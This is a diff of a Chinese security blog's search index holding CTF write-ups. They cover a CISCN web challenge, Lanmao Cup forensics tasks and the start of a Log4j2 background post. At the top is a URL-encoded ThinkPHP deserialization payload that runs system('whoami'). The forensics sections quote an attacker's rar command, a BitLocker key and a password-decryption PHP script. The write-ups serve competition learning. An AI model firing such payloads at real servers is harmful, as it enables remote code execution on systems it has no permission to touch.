-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>POST方式提交到<code>/index.php/index/test</code>得到flag</p>
-<p> <img src="/img/ciscn15/09b19555a94fb43eed78855b59ef272c.png" alt="09b19555a94fb43eed78855b59ef272c.png"></p>
-</li>
-</ol>
-<ul>
-<li><strong>flag: flag{85d52d33-9e9b-42a7-9970-fbe62641acf3}</strong></li>
-</ul>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-        <tag>CTF</tag>
-        <tag>ciscn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【WP】第六届蓝帽杯</title>
-    <url>/2022/07/09/lanmao-wp/</url>
-    <content><![CDATA[<blockquote>
-<p>😋蓝帽杯又名取证杯，原来是被队友带飞的一天，有被爽到！</p>
-</blockquote>
-<h3 id="题目序号2-Domainhacker"><a href="#题目序号2-Domainhacker" class="headerlink" title="题目序号2 Domainhacker"></a>题目序号2 Domainhacker</h3><p>公司安全部门，在流量设备中发现了疑似黑客入侵的痕迹，用户似乎获取了机器的hash，你能通过分析流量，找到机器的hash吗？</p>
-<h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、打开流量包，导出所有文件</p>
-<p>2、发现1.rar,含有文本</p>
-<p>3、打开所有php页面，用URL和Base64解码</p>
-<p>4、获取关键信息：cd &#x2F;d “c:\\Windows\\Temp”&amp;rar.exe a -PSecretsPassw0rds 1.rar 1.txt</p>
-<p>5、得压缩包密码SecretsPassw0rds，打开文本获取猕猴桃导出的哈希值</p>
-<p><img src="/img/lanmao6/clip_image006.jpg"></p>
-<h3 id="flag值："><a href="#flag值：" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{416f89c3a5deb1d398a1a1fce93862a7}</p>
-<h3 id="题目序号9-手机取证-1"><a href="#题目序号9-手机取证-1" class="headerlink" title="题目序号9 手机取证_1"></a>题目序号9 手机取证_1</h3><p>627604C2-C586-48C1-AA16-FF33C3022159.PNG图片的分辨率是？</p>
-<h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p>搜索关键字“627604C2-C586-48C1-AA16-FF33C3022159.PNG”，得出唯一图片及其属性。<img src="/img/lanmao6/clip_image008.jpg"></p>
-<h3 id="flag值：-1"><a href="#flag值：-1" class="headerlink" title="flag值："></a>flag值：</h3><p>360x360</p>
-<h3 id="题目序号10-手机取证-2"><a href="#题目序号10-手机取证-2" class="headerlink" title="题目序号10 手机取证_2"></a>题目序号10 手机取证_2</h3><p>姜总的快递单号是多少？</p>
-<h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><p>搜索关键字“姜总”，在skype聊天记录中找到快递单号</p>
-<p><img src="/img/lanmao6/clip_image010.jpg"></p>
-<h3 id="flag值：-2"><a href="#flag值：-2" class="headerlink" title="flag值："></a>flag值：</h3><p>SF1142358694796</p>
-<h3 id="题目序号11-计算机取证-1"><a href="#题目序号11-计算机取证-1" class="headerlink" title="题目序号11 计算机取证_1"></a>题目序号11 计算机取证_1</h3><p>现对一个windows计算机进行取证，请您对以下问题进行分析解答。</p>
-<p>从内存镜像中获得taqi7的开机密码是多少?</p>
-<h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h3><p>使用取证工具“Passware Kit Forensic”</p>
-<p><img src="/img/lanmao6/clip_image012.jpg"></p>
-<h3 id="flag值：-3"><a href="#flag值：-3" class="headerlink" title="flag值："></a>flag值：</h3><p>anxnqi</p>
-<h3 id="题目序号12-计算机取证-2"><a href="#题目序号12-计算机取证-2" class="headerlink" title="题目序号12 计算机取证_2"></a>题目序号12 计算机取证_2</h3><p>制作该内存镜像的进程Pid号是多少？</p>
-<h3 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a>操作内容：</h3><p>内存分析，找到内存镜像制作工具，获取PID</p>
-<p><img src="/img/lanmao6/clip_image014.jpg"></p>
-<h3 id="flag值：-4"><a href="#flag值：-4" class="headerlink" title="flag值："></a>flag值：</h3><p>2192</p>
-<h3 id="题目序号13-计算机取证-3"><a href="#题目序号13-计算机取证-3" class="headerlink" title="题目序号13 计算机取证_3"></a>题目序号13 计算机取证_3</h3><p>bitlokcer分区某office文件中存在的flag值为？</p>
-<h3 id="操作内容：-5"><a href="#操作内容：-5" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、EFDD跑出内存镜像中的bitlocker密钥：368346-029557-428142-651420-492261-552431-515438-338239</p>
-<p>2、盘古石输入密钥解密，导出office文件和字典</p>
-<p>3、用pass.txt做字典爆破，密码：287fuweiuhfiute，打开ppt得flag</p>
-<p><img src="/img/lanmao6/clip_image016.jpg"></p>
-<h3 id="flag值：-5"><a href="#flag值：-5" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{b27867b66866866686866883bb43536}</p>
-<h3 id="题目序号14-计算机取证-4"><a href="#题目序号14-计算机取证-4" class="headerlink" title="题目序号14 计算机取证_4"></a>题目序号14 计算机取证_4</h3><p>TrueCrypt加密中存在的flag值为？</p>
-<h3 id="操作内容：-6"><a href="#操作内容：-6" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、EFDD中用内存镜像文件解密容器</p>
-<p><img src="/img/lanmao6/clip_image018.jpg"></p>
-<p>2、加载解密后的容器，提取加密压缩包哈哈哈.zip,爆破，打开得flag</p>
-<p><img src="/img/lanmao6/clip_image020.jpg"></p>
-<h3 id="flag值：-6"><a href="#flag值：-6" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{1349934913913991394cacacacacacc}</p>
-<h3 id="题目序号15-程序分析-1"><a href="#题目序号15-程序分析-1" class="headerlink" title="题目序号15 程序分析_1"></a>题目序号15 程序分析_1</h3><p>现已获取某个APP程序，请您对以下问题进行分析解答。</p>
-<p>本程序包名是？</p>
-<h3 id="操作内容：-7"><a href="#操作内容：-7" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、执行:aapt dump badging EXEC.apk</p>
-<p>2、找到包名</p>
-<p><img src="/img/lanmao6/clip_image022.jpg"></p>
-<h3 id="flag值：-7"><a href="#flag值：-7" class="headerlink" title="flag值："></a>flag值：</h3><p>exec.azj.kny.d.c</p>
-<h3 id="题目序号16-程序分析-2"><a href="#题目序号16-程序分析-2" class="headerlink" title="题目序号16 程序分析_2"></a>题目序号16 程序分析_2</h3><p>本程序的入口是？</p>
-<h3 id="操作内容：-8"><a href="#操作内容：-8" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、执行:aapt dump badging EXEC.apk</p>
-<p>2、找到入口</p>
-<p><img src="/img/lanmao6/clip_image024.jpg"></p>
-<h3 id="flag值：-8"><a href="#flag值：-8" class="headerlink" title="flag值："></a>flag值：</h3><p>minmtta.hemjcbm.ahibyws.MainActivity</p>
-<h3 id="题目序号17-程序分析-3"><a href="#题目序号17-程序分析-3" class="headerlink" title="题目序号17 程序分析_3"></a>题目序号17 程序分析_3</h3><p>本程序的服务器地址的密文是？</p>
-<h3 id="操作内容：-9"><a href="#操作内容：-9" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、提取class.dex，反编译成class.jar，jd打开</p>
-<p>2、MainActivity中找到base64加密代码</p>
-<p>3、解码为：<a href="https://ansjk.ecxeio.xyz/"></a></p>
-<p><img src="/img/lanmao6/clip_image026.jpg"></p>
-<h3 id="flag值：-9"><a href="#flag值：-9" class="headerlink" title="flag值："></a>flag值：</h3><p>aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6</p>
-<h3 id="题目序号19-网站取证-1"><a href="#题目序号19-网站取证-1" class="headerlink" title="题目序号19 网站取证_1"></a>题目序号19 网站取证_1</h3><p>据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。</p>
-<p>请从网站源码中找出木马文件，并提交木马连接的密码。</p>
-<h3 id="操作内容：-10"><a href="#操作内容：-10" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、D盾扫webshell</p>
-<p>2、得WWW\runtime\temp\0f71e181346d43e56722aec663e5d4e9.php文件为吗，打开查看连接密码</p>
-<p><img src="/img/lanmao6/clip_image028.jpg"></p>
-<h3 id="flag值：-10"><a href="#flag值：-10" class="headerlink" title="flag值："></a>flag值：</h3><p>lanmaobei666</p>
-<h3 id="题目序号20-网站取证-2"><a href="#题目序号20-网站取证-2" class="headerlink" title="题目序号20 网站取证_2"></a>题目序号20 网站取证_2</h3><h3 id="请提交数据库连接的明文密码。（答案参考格式：abcABC123）"><a href="#请提交数据库连接的明文密码。（答案参考格式：abcABC123）" class="headerlink" title="请提交数据库连接的明文密码。（答案参考格式：abcABC123）"></a>请提交数据库连接的明文密码。（答案参考格式：abcABC123）</h3><h3 id="操作内容：-11"><a href="#操作内容：-11" class="headerlink" title="操作内容："></a>操作内容：</h3><ol>
-<li><p>加密函数的php源代码在目录www\application\encrypt下的encrypt.php</p>
-</li>
-<li><p>观察函数解密逻辑，并简单重写调试一下，代码如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/r/n&quot;</span>, <span class="string">&quot;/r&quot;</span>, <span class="string">&quot;/n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;PanGuShi&#x27;</span>;</span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line"><span class="variable">$td</span> = mcrypt\_module\<span class="title function_ invoke__">_open</span>(MCRYPT\_RIJNDAEL\_128,<span class="string">&quot;&quot;</span>,MCRYPT\_MODE\_CBC,<span class="string">&quot;&quot;</span>);</span><br><span class="line">mcrypt\_generic\<span class="title function_ invoke__">_init</span>(<span class="variable">$td</span>, <span class="string">&quot;PanGuShi&quot;</span>, <span class="variable">$iv</span>);</span><br><span class="line"><span class="variable">$decode</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$dencrypted</span> = <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$td</span>, <span class="variable">$decode</span>);</span><br><span class="line">mcrypt\_generic\<span class="title function_ invoke__">_deinit</span>(<span class="variable">$td</span>);</span><br><span class="line">mcrypt\_module\<span class="title function_ invoke__">_close</span>(<span class="variable">$td</span>);</span><br><span class="line"><span class="variable">$dencrypted</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$dencrypted</span>);</span><br><span class="line"><span class="comment">// echo $str;</span></span><br><span class="line"><span class="comment">// echo $iv;</span></span><br><span class="line"><span class="comment">// echo $td;</span></span><br><span class="line"><span class="comment">// echo $decode;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dencrypted</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>运行php代码，得到解密后的明文密码，即flag值</p>
-</li>
-</ol>
-<p><img src="/img/lanmao6/clip_image030.gif"></p>
-<p>flag值：KBLT123</p>
-<h3 id="题目序号21-网站取证-3"><a href="#题目序号21-网站取证-3" class="headerlink" title="题目序号21 网站取证_3"></a>题目序号21 网站取证_3</h3><h3 id="请提交数据库金额加密混淆使用的盐值。"><a href="#请提交数据库金额加密混淆使用的盐值。" class="headerlink" title="请提交数据库金额加密混淆使用的盐值。"></a>请提交数据库金额加密混淆使用的盐值。</h3><h3 id="操作内容：-12"><a href="#操作内容：-12" class="headerlink" title="操作内容："></a>操作内容：</h3><p>全局搜索money关键词，发现与加密相关函数及其key。</p>
-<p><img src="/img/lanmao6/clip_image032.gif"></p>
-<h3 id="flag值：-11"><a href="#flag值：-11" class="headerlink" title="flag值："></a>flag值：</h3><p>jyzg123456</p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-        <tag>CTF</tag>
-        <tag>蓝帽杯</tag>
-        <tag>取证技术</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Graph Structures</title>
     <url>/2021/05/29/graph-structure/</url>
     <content><![CDATA[<h1 id="图（概念多，算法较为复杂）"><a href="#图（概念多，算法较为复杂）" class="headerlink" title="图（概念多，算法较为复杂）"></a>图<span style="color: green;">（概念多，算法较为复杂）</span></h1><ol>
@@ -2729,9 +2581,142 @@
       </tags>
   </entry>
   <entry>
+    <title>【WP】第六届蓝帽杯</title>
+    <url>/2022/07/09/lanmao-wp/</url>
+    <content><![CDATA[<blockquote>
+<p>😋蓝帽杯又名取证杯，原来是被队友带飞的一天，有被爽到！</p>
+</blockquote>
+<h3 id="题目序号2-Domainhacker"><a href="#题目序号2-Domainhacker" class="headerlink" title="题目序号2 Domainhacker"></a>题目序号2 Domainhacker</h3><p>公司安全部门，在流量设备中发现了疑似黑客入侵的痕迹，用户似乎获取了机器的hash，你能通过分析流量，找到机器的hash吗？</p>
+<h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、打开流量包，导出所有文件</p>
+<p>2、发现1.rar,含有文本</p>
+<p>3、打开所有php页面，用URL和Base64解码</p>
+<p>4、获取关键信息：cd &#x2F;d “c:\\Windows\\Temp”&amp;rar.exe a -PSecretsPassw0rds 1.rar 1.txt</p>
+<p>5、得压缩包密码SecretsPassw0rds，打开文本获取猕猴桃导出的哈希值</p>
+<p><img src="/img/lanmao6/clip_image006.jpg"></p>
+<h3 id="flag值："><a href="#flag值：" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{416f89c3a5deb1d398a1a1fce93862a7}</p>
+<h3 id="题目序号9-手机取证-1"><a href="#题目序号9-手机取证-1" class="headerlink" title="题目序号9 手机取证_1"></a>题目序号9 手机取证_1</h3><p>627604C2-C586-48C1-AA16-FF33C3022159.PNG图片的分辨率是？</p>
+<h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p>搜索关键字“627604C2-C586-48C1-AA16-FF33C3022159.PNG”，得出唯一图片及其属性。<img src="/img/lanmao6/clip_image008.jpg"></p>
+<h3 id="flag值：-1"><a href="#flag值：-1" class="headerlink" title="flag值："></a>flag值：</h3><p>360x360</p>
+<h3 id="题目序号10-手机取证-2"><a href="#题目序号10-手机取证-2" class="headerlink" title="题目序号10 手机取证_2"></a>题目序号10 手机取证_2</h3><p>姜总的快递单号是多少？</p>
+<h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><p>搜索关键字“姜总”，在skype聊天记录中找到快递单号</p>
+<p><img src="/img/lanmao6/clip_image010.jpg"></p>
+<h3 id="flag值：-2"><a href="#flag值：-2" class="headerlink" title="flag值："></a>flag值：</h3><p>SF1142358694796</p>
+<h3 id="题目序号11-计算机取证-1"><a href="#题目序号11-计算机取证-1" class="headerlink" title="题目序号11 计算机取证_1"></a>题目序号11 计算机取证_1</h3><p>现对一个windows计算机进行取证，请您对以下问题进行分析解答。</p>
+<p>从内存镜像中获得taqi7的开机密码是多少?</p>
+<h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h3><p>使用取证工具“Passware Kit Forensic”</p>
+<p><img src="/img/lanmao6/clip_image012.jpg"></p>
+<h3 id="flag值：-3"><a href="#flag值：-3" class="headerlink" title="flag值："></a>flag值：</h3><p>anxnqi</p>
+<h3 id="题目序号12-计算机取证-2"><a href="#题目序号12-计算机取证-2" class="headerlink" title="题目序号12 计算机取证_2"></a>题目序号12 计算机取证_2</h3><p>制作该内存镜像的进程Pid号是多少？</p>
+<h3 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a>操作内容：</h3><p>内存分析，找到内存镜像制作工具，获取PID</p>
+<p><img src="/img/lanmao6/clip_image014.jpg"></p>
+<h3 id="flag值：-4"><a href="#flag值：-4" class="headerlink" title="flag值："></a>flag值：</h3><p>2192</p>
+<h3 id="题目序号13-计算机取证-3"><a href="#题目序号13-计算机取证-3" class="headerlink" title="题目序号13 计算机取证_3"></a>题目序号13 计算机取证_3</h3><p>bitlokcer分区某office文件中存在的flag值为？</p>
+<h3 id="操作内容：-5"><a href="#操作内容：-5" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、EFDD跑出内存镜像中的bitlocker密钥：368346-029557-428142-651420-492261-552431-515438-338239</p>
+<p>2、盘古石输入密钥解密，导出office文件和字典</p>
+<p>3、用pass.txt做字典爆破，密码：287fuweiuhfiute，打开ppt得flag</p>
+<p><img src="/img/lanmao6/clip_image016.jpg"></p>
+<h3 id="flag值：-5"><a href="#flag值：-5" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{b27867b66866866686866883bb43536}</p>
+<h3 id="题目序号14-计算机取证-4"><a href="#题目序号14-计算机取证-4" class="headerlink" title="题目序号14 计算机取证_4"></a>题目序号14 计算机取证_4</h3><p>TrueCrypt加密中存在的flag值为？</p>
+<h3 id="操作内容：-6"><a href="#操作内容：-6" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、EFDD中用内存镜像文件解密容器</p>
+<p><img src="/img/lanmao6/clip_image018.jpg"></p>
+<p>2、加载解密后的容器，提取加密压缩包哈哈哈.zip,爆破，打开得flag</p>
+<p><img src="/img/lanmao6/clip_image020.jpg"></p>
+<h3 id="flag值：-6"><a href="#flag值：-6" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{1349934913913991394cacacacacacc}</p>
+<h3 id="题目序号15-程序分析-1"><a href="#题目序号15-程序分析-1" class="headerlink" title="题目序号15 程序分析_1"></a>题目序号15 程序分析_1</h3><p>现已获取某个APP程序，请您对以下问题进行分析解答。</p>
+<p>本程序包名是？</p>
+<h3 id="操作内容：-7"><a href="#操作内容：-7" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、执行:aapt dump badging EXEC.apk</p>
+<p>2、找到包名</p>
+<p><img src="/img/lanmao6/clip_image022.jpg"></p>
+<h3 id="flag值：-7"><a href="#flag值：-7" class="headerlink" title="flag值："></a>flag值：</h3><p>exec.azj.kny.d.c</p>
+<h3 id="题目序号16-程序分析-2"><a href="#题目序号16-程序分析-2" class="headerlink" title="题目序号16 程序分析_2"></a>题目序号16 程序分析_2</h3><p>本程序的入口是？</p>
+<h3 id="操作内容：-8"><a href="#操作内容：-8" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、执行:aapt dump badging EXEC.apk</p>
+<p>2、找到入口</p>
+<p><img src="/img/lanmao6/clip_image024.jpg"></p>
+<h3 id="flag值：-8"><a href="#flag值：-8" class="headerlink" title="flag值："></a>flag值：</h3><p>minmtta.hemjcbm.ahibyws.MainActivity</p>
+<h3 id="题目序号17-程序分析-3"><a href="#题目序号17-程序分析-3" class="headerlink" title="题目序号17 程序分析_3"></a>题目序号17 程序分析_3</h3><p>本程序的服务器地址的密文是？</p>
+<h3 id="操作内容：-9"><a href="#操作内容：-9" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、提取class.dex，反编译成class.jar，jd打开</p>
+<p>2、MainActivity中找到base64加密代码</p>
+<p>3、解码为：<a href="https://ansjk.ecxeio.xyz/"></a></p>
+<p><img src="/img/lanmao6/clip_image026.jpg"></p>
+<h3 id="flag值：-9"><a href="#flag值：-9" class="headerlink" title="flag值："></a>flag值：</h3><p>aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6</p>
+<h3 id="题目序号19-网站取证-1"><a href="#题目序号19-网站取证-1" class="headerlink" title="题目序号19 网站取证_1"></a>题目序号19 网站取证_1</h3><p>据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。</p>
+<p>请从网站源码中找出木马文件，并提交木马连接的密码。</p>
+<h3 id="操作内容：-10"><a href="#操作内容：-10" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、D盾扫webshell</p>
+<p>2、得WWW\runtime\temp\0f71e181346d43e56722aec663e5d4e9.php文件为吗，打开查看连接密码</p>
+<p><img src="/img/lanmao6/clip_image028.jpg"></p>
+<h3 id="flag值：-10"><a href="#flag值：-10" class="headerlink" title="flag值："></a>flag值：</h3><p>lanmaobei666</p>
+<h3 id="题目序号20-网站取证-2"><a href="#题目序号20-网站取证-2" class="headerlink" title="题目序号20 网站取证_2"></a>题目序号20 网站取证_2</h3><h3 id="请提交数据库连接的明文密码。（答案参考格式：abcABC123）"><a href="#请提交数据库连接的明文密码。（答案参考格式：abcABC123）" class="headerlink" title="请提交数据库连接的明文密码。（答案参考格式：abcABC123）"></a>请提交数据库连接的明文密码。（答案参考格式：abcABC123）</h3><h3 id="操作内容：-11"><a href="#操作内容：-11" class="headerlink" title="操作内容："></a>操作内容：</h3><ol>
+<li><p>加密函数的php源代码在目录www\application\encrypt下的encrypt.php</p>
+</li>
+<li><p>观察函数解密逻辑，并简单重写调试一下，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/r/n&quot;</span>, <span class="string">&quot;/r&quot;</span>, <span class="string">&quot;/n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;PanGuShi&#x27;</span>;</span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line"><span class="variable">$td</span> = mcrypt\_module\<span class="title function_ invoke__">_open</span>(MCRYPT\_RIJNDAEL\_128,<span class="string">&quot;&quot;</span>,MCRYPT\_MODE\_CBC,<span class="string">&quot;&quot;</span>);</span><br><span class="line">mcrypt\_generic\<span class="title function_ invoke__">_init</span>(<span class="variable">$td</span>, <span class="string">&quot;PanGuShi&quot;</span>, <span class="variable">$iv</span>);</span><br><span class="line"><span class="variable">$decode</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$dencrypted</span> = <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$td</span>, <span class="variable">$decode</span>);</span><br><span class="line">mcrypt\_generic\<span class="title function_ invoke__">_deinit</span>(<span class="variable">$td</span>);</span><br><span class="line">mcrypt\_module\<span class="title function_ invoke__">_close</span>(<span class="variable">$td</span>);</span><br><span class="line"><span class="variable">$dencrypted</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$dencrypted</span>);</span><br><span class="line"><span class="comment">// echo $str;</span></span><br><span class="line"><span class="comment">// echo $iv;</span></span><br><span class="line"><span class="comment">// echo $td;</span></span><br><span class="line"><span class="comment">// echo $decode;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dencrypted</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>运行php代码，得到解密后的明文密码，即flag值</p>
+</li>
+</ol>
+<p><img src="/img/lanmao6/clip_image030.gif"></p>
+<p>flag值：KBLT123</p>
+<h3 id="题目序号21-网站取证-3"><a href="#题目序号21-网站取证-3" class="headerlink" title="题目序号21 网站取证_3"></a>题目序号21 网站取证_3</h3><h3 id="请提交数据库金额加密混淆使用的盐值。"><a href="#请提交数据库金额加密混淆使用的盐值。" class="headerlink" title="请提交数据库金额加密混淆使用的盐值。"></a>请提交数据库金额加密混淆使用的盐值。</h3><h3 id="操作内容：-12"><a href="#操作内容：-12" class="headerlink" title="操作内容："></a>操作内容：</h3><p>全局搜索money关键词，发现与加密相关函数及其key。</p>
+<p><img src="/img/lanmao6/clip_image032.gif"></p>
+<h3 id="flag值：-11"><a href="#flag值：-11" class="headerlink" title="flag值："></a>flag值：</h3><p>jyzg123456</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>网络空间安全</tag>
+        <tag>CTF</tag>
+        <tag>蓝帽杯</tag>
+        <tag>取证技术</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【高危】Log4j2漏洞分析&amp;复现</title>
     <url>/2021/12/10/log4j2-1/</url>
-    <content><![CDATA[<h1 id="暂不公开，敬请期待-👋"><a href="#暂不公开，敬请期待-👋" class="headerlink" title="暂不公开，敬请期待 👋"></a>暂不公开，敬请期待 👋</h1>]]></content>
+    <content><![CDATA[<h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><h3 id="JNDI的相关概念"><a href="#JNDI的相关概念" class="headerlink" title="JNDI的相关概念"></a>JNDI的相关概念</h3><p>随着信息技术的发展，越来越多的企业开始采用分布式系统来管理和处理数据，这种系统能够提高计算效率、灵活性和可靠性，但同时也带来了资源分散和复杂度增加的问题。现代网络技术支持下，为满足大企业高效数据处理和科学决策需求，命名和目录服务是网络上资源协同合作的核心组成部分。它提供统一的存储容器和描述方法，包括资源名称、位置、访问方式、管理和安全信息，以方便在分布式环境下的协同和共享，从而实现高效数据处理和科学决策。</p>
+<p>目录服务可以实现透明地对信息资源访问，助力客户端快速查询和定位资源，无需关心具体位置。JNDI是JAVA平台的标准扩展，类似于索引中心，允许客户端通过名称发现和查找数据和对象。其使得应用程序能够通过统一的方式来访问不同类型的命名和目录服务，而具体实现与之无关。JNDI常用于动态加载数据库配置文件，避免对数据库代码进行修改。它通过存储数据库连接信息在命名和目录服务中实现解耦合，并简化了维护工作。</p>
+<p>JNDI的优势在于不仅提供统一访问接口，还实现屏蔽了不同命名和目录服务之间接口或协议等细节差异。JNNDI不仅能与多种不同类型命名和目录服务（如LDAP、DNS等）无缝集成，还使得各种它们间可相互作用，兼容跨多不同的命名空间进行混合名称，此外JNDI还可支撑目录存储和检索JAVA对象的方式来链接各类型的数据。下图为JNDI与目录服务器以及各接口的结构示意图：<br><img src="/img/log4j2/8.gif"></p>
+<h3 id="JAVA日志框架"><a href="#JAVA日志框架" class="headerlink" title="JAVA日志框架"></a>JAVA日志框架</h3><h4 id="SLF4J与Logback框架"><a href="#SLF4J与Logback框架" class="headerlink" title="SLF4J与Logback框架"></a>SLF4J与Logback框架</h4><p>SLF4J（Simple Logging Facade for Java，简单日志门面）是一个标准接口，用于存取日志。它提供了统一的日志打印接口，应用只需按照其提供的方法打印日志，具体的日志格式和打印方式由底层的日志框架实现。由此，程序可自适应转变框架，而无需对代码进行修改。类似于JDBC，SLF4J只是一个统一的接口，底层的日志框架提供具体的实现，而具体想要如何使用，则必须搭配其子系统，如Logback、Log4j、Log4j2等日志框架。Logback相比其他品类，它显得更加灵活和易于配置，因此它受到了广泛的采用。Logback的架构主要由三个类组成，分别是： Logger、Appender以及Layout。Logback的依赖则分为三个不同模块分别是：logback-core，logback-classic，logback-access。</p>
+<p>相比于Log4j的升级版日志框架，Log4j框架仅支持两种格式配置文件，一种是基于Java的特性文件，一种是基于XML格式（主要格式样式：键&#x3D;键值）。</p>
